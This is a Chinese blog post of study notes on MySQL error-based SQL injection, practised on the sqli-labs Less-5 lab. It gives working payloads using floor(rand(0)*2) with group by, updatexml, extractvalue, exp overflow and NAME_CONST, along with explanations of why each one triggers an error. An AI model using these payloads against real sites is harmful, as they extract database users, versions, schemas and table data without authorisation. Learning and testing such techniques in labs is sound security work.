---
title: SQL报错注入总结
date: 2017-04-16 15:07:59
tags: 
- SQL注入
categories: 
- 漏洞

---


### 参考资料：

[http://www.waitalone.cn/mysql-error-based-injection.html](http://www.waitalone.cn/mysql-error-based-injection.html)
[http://www.111cn.net/database/mysql/47680.htm](http://www.111cn.net/database/mysql/47680.htm)


一些基本的查基本信息的语句：

查库 (select schema_name from information_schema.schemata limit m,n)

查表 (select table_name from information_schema.columns where table_schema=’whc’ limit 0,1)

查字段 (select column_name from information_schema.columns where table_schema=’whc’ limit 0,1)

加上limit 是因为sqllab里面限制了回显的个数，实战里面应该用不到。
<!--more-->


### 00x1 floor方式

**用法：**

```
select 1,count(*),concat(0x3a,0x3a,(select use()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;
```


**函数释义：**

> rand() 随机数函数 产生0-1的随机数
> count(_) 计数
> floor() 向下取整函数，舍去小数点，比如：floor(1.3)=1
> floor(rand()_2) 结果只有0和1
> group by name 按name的首位字典顺序排列
> concat() 连接括号里面的内容
> select 1 from (table name) 派生表

此处有三个点，一是需要count计数，二是floor，取得0 or 1，进行数据的重复，三是group by进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时重复造成的错误。也有解释为mysql 的bug 的问题。但是此处需要将rand(0)，rand()需要多试几次才行。

**在sqllab less-5上进行测试**

![](http://oohnuejim.bkt.clouddn.com/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A51.png)

这里只用user()来做实例，其他爆表，爆字段直接代替user()就行了

```
id=1' union select 1,count(*),concat(0x3a,0x3a,user(),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+
```

可以简化成这样

```
id=1' and  (select count(*) from information_schema.tables group by concat(0x3a,0x3a,version(),0x3a,0x3a,floor(rand(0)*2))) --+
```

也可以改成这样

```
id=1' and  (select 1 from (select count(*),(concat(0x3a,user(),0x3a,floor(rand()*2)))name from information_schema.tables group by name)b --+
```

语句分解：

> (select 1 from b) //在b上做派生表
> b=select count(_),name from information_schema.tables group by name //从information_schema里面选取那么的内容和计数的内容
> name=concat(0x3a,(查询内容),0x3a,floor(rand()_2)) //把:和查询内容，还有随机取整数 连接在一起

具体为什么count(_),floor(rand(0)_2) group by 会报错，必须说这三个元素必须全部放在一个语句里才能报错。
http://mp.weixin.qq.com/s__biz=MzA5NDY0OTQ0Mw==&mid=403404979&idx=1&sn=27d10b6da357d72304086311cefd573e&scene=1&srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect

*   解释下 select 1 from table

它的作用就是 增加临时列，每行的列值是写在select后的数，这条sql语句中是1
![](http://oohnuejim.bkt.clouddn.com/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A52%20.png)


*   rand(0) rand(1)和rand()的区别
![](http://oohnuejim.bkt.clouddn.com/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5rand%EF%BC%88%EF%BC%89.png)
![](http://oohnuejim.bkt.clouddn.com/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5rand%EF%BC%881%EF%BC%89.png)
![](http://oohnuejim.bkt.clouddn.com/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5rand%EF%BC%880%EF%BC%89.png)

rand()会随机报错，就是有可能报错，有的时候不会，rand(0)肯定会报错，rand(1)则一定不会报错。
所以要让他报错的话直接用rand(0)





### 00x2 xpath函数

如果细究这个会浪费很多时间，而且我目前没怎么接触过XML，所以就简略地介绍下这个函数的用法了。
想了解的可以多搜索一些关于xpath注入，这也是sql注入的额一种趋势吧。


*   updatexml()  最多爆出32位的

函数原型：
```
updatexml(xml_target, xpath_expr, new_xml)
```

第一个参数是目标xml，第二个参数是xpath表达式，第三个参数替换目标xml的新的xml。注入中只关心第二个参数就够了。（XPath 是一门在 XML（可扩展标记语言）文档中查找信息的语言。）

用法：
```
updatexml(1,concat(0x3a,(查询内容),0x3a),1)
```

在MySQL控制台里面实测下

![](http://oohnuejim.bkt.clouddn.com/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5updatexml.png)

*   extractvalue()  最多爆出32位的

extractvalue方式与updatexml类似，只是extractvalue()中少了第三个参数

用法：

```
extractvalue(1, concat(0x3a, (查询内容),0x3a))
```

在MySQL里实测下
![](http://oohnuejim.bkt.clouddn.com/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5extract.png)  

注意几点，语句出错，想了半天没想明白怎么回事。是union语句连接2个语句的时候，2条语句所在的表形式不同所以返回不了。  
![](http://ww4.sinaimg.cn/large/006HJ39wgy1fffdiqh36vj318u0dkajc.jpg)  
![](http://ww4.sinaimg.cn/large/006HJ39wgy1fffdk4awm6j31830dbk0l.jpg)

### 00x3 值类型超出范围导致报错

在MySQL版本大于等于5.5.5的的时候才能用户

*   double型函数exp()超出范围

这个函数为以e为底的对数函数

用法：

```
select exp(~(select*from(select user())x))
```

报错具体原理http://www.cnblogs.com/lcamry/articles/5509124.html

![](http://oohnuejim.bkt.clouddn.com/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5~exp.png)

*   bigint超出范围

具体原理[http://www.cnblogs.com/lcamry/articles/5509112.html](http://www.cnblogs.com/lcamry/articles/5509112.html)
跟上面的差不多。


### 00x4 利用数据重复性

用法：
```
select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x
```
这里的version()出现了2次，所以报错。

![](http://oohnuejim.bkt.clouddn.com/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%20%E6%95%B0%E6%8D%AE%E9%87%8D%E5%A4%8D.png)